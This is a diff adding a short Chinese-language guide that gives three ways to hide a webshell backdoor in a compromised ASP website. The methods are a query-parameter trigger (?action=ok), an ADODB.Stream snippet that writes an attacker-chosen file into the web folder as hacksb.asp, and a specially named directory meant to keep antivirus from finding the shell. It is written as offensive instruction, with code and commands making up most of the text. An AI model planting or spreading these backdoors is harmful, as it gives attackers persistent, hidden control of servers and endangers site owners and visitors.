@@ -1,0 +1,31 @@
+
+第一种:
+在我们要做手脚的asp文件里加入如下内容
+<%if request(”action”)=”ok” then%>
+shell代码插在这里
+<%end if%>
+访问的时候在你作手脚的asp文件后面加上?action=ok,即可
+
+第二种:
+在我们要做手脚的asp文件里加入如下内容
+<%
+on error resume next
+strFileName = Request.QueryString(”filer”)
+set objStream = Server.createObject(”ABODB.Stream”)
+objStream.Type = 1
+objStream.Open
+objStream.LoadFromFile strFileName
+objStream.SaveToFile Server.mappath(”hacksb.asp”),2
+%>
+访问的时候在做手脚的asp文件后面加上?filer=xxx,
+xxx为你本地上传的一个路径如C:\hacksb.asp,
+上传后在做手脚的asp的同文件夹中会自动生成hacksb.asp
+
+第三种:
+前提得到system权限,
+进入网站目录下一层
+mkdir s…
+copy hacksb.asp s…/
+这样杀毒软件找不到的
+访问http://网站/s…/hacksb.asp即可
+ 
